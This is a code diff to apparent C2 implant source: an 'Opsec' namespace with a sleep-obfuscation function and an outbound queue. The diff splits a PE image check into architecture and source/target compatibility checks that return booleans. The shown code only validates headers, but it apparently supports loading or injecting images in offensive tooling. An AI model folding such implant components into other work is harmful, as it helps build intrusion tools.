@@ -151,20 +151,41 @@ namespace Opsec {
         Dispatcher::OutboundQueue(entry);
     }
 
-    VOID SeImageCheck(const _executable *const source, const _executable *const target) {
+    BOOL SeImageCheckArch(const _executable *const image) {
+        HEXANE
+
+#if _WIN64
+        if (image->nt_head->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
+            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
+            return false;
+        }
+
+#else
+        if (image->nt_head->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
+            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
+            return false;
+        }
+#endif
+        return true;
+    }
+
+    BOOL SeImageCheckCompat(const _executable *const source, const _executable *const target) {
         HEXANE
 
         if (source->nt_head->Signature != IMAGE_NT_SIGNATURE) {
             ntstatus = ERROR_INVALID_EXE_SIGNATURE;
-            return;
+            return false;
         }
         if (target->nt_head->FileHeader.Machine != source->nt_head->FileHeader.Machine) {
             ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
-            return;
+            return false;
         }
         if (target->nt_head->OptionalHeader.Subsystem != source->nt_head->OptionalHeader.Subsystem) {
             ntstatus = ERROR_IMAGE_SUBSYSTEM_NOT_PRESENT;
+            return false;
         }
+
+        return true;
     }
 
     VOID SleepObf() {
